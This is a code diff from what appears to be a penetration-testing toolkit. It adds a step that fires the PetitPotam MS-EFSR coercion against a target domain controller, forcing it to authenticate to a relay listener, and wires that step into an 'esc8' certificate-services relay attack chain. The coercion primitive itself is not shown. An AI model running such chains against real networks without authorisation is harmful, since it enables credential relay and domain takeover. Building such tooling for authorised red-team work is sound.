@@ -304,6 +304,64 @@ def _stub_action(msg):
     return _action
 
 
+# ---------------------------------------------------------------- coerce steps
+
+def _petitpotam_action(chain, ctx):
+    """The D2 landing: fire the PetitPotam MS-EFSR coerce and map the
+    :class:`~fieldkit.coerce.CoerceResult` kind to a chain Outcome.
+
+    Reads from ``ctx``:
+      * ``ctx.listener_uri``  (required) — SMB path the target will
+        auth to. Set to a placeholder that reaches the relay listener
+        D3 stands up; None → manual outcome ("listener not configured").
+      * ``ctx.cred`` (optional) — dict {domain, username, password} for
+        auth to the MS-EFSR endpoint. Modern DCs require it.
+      * ``ctx.petitpotam_tool_bin`` (optional) — override the tool path
+        the primitive auto-detects. Test hook + operator override.
+      * ``ctx.petitpotam_timeout`` (optional) — subprocess timeout.
+    """
+    from .coerce import petitpotam
+    listener_uri = getattr(ctx, "listener_uri", None)
+    if not listener_uri:
+        return Outcome(
+            kind="manual",
+            evidence=("listener_uri not configured on ctx — D3's relay "
+                      "listener isn't wired in yet, run "
+                      "`fieldkit chain run esc8 <target> --listener <smb-uri>` "
+                      "when the relay slice lands"))
+    result = petitpotam.fire(
+        target=chain.target,
+        listener_uri=listener_uri,
+        cred=getattr(ctx, "cred", None),
+        tool_bin=getattr(ctx, "petitpotam_tool_bin", None),
+        tool_timeout=getattr(ctx, "petitpotam_timeout", 15))
+    # Map coerce kind → chain outcome kind.
+    #   ok         → ok         (proceed to relay step)
+    #   patched    → skip       (this DC is patched; profile aborts;
+    #                            D4/D5 will introduce PrinterBug fallback)
+    #   unreachable → fail      (chain can't recover)
+    #   auth-error → fail       (bad or missing cred)
+    #   no-tool    → manual     (prepare-only playbook: operator runs
+    #                            the command_hint themselves)
+    #   fail       → fail
+    kind_map = {"ok": "ok", "patched": "skip", "unreachable": "fail",
+                "auth-error": "fail", "no-tool": "manual", "fail": "fail"}
+    outcome_kind = kind_map[result.kind]
+    # For the no-tool path, tack the command hint onto the evidence
+    # so `fieldkit chain show` renders it inline.
+    evidence = result.evidence
+    if result.kind == "no-tool" and result.command_hint:
+        evidence = f"{evidence}\n  run: {result.command_hint}"
+    return Outcome(
+        kind=outcome_kind,
+        evidence=evidence,
+        data={"petitpotam": {
+            "listener_uri": listener_uri,
+            "result_kind": result.kind,
+            "detail": result.detail,
+        }})
+
+
 # ---------------------------------------------------------------- esc8 profile
 
 @register("esc8")
@@ -325,7 +383,7 @@ def esc8_chain(target_dc, ca_endpoint=None, cred=None):
             REACHABILITY_STEP,
             Step("coerce:petitpotam",
                  "target-side",
-                 _stub_action("coerce primitive lands in D2 (PetitPotam MS-EFSR)"),
+                 _petitpotam_action,
                  detection_cost=3),
             Step("relay:listen",
                  "attacker-side",
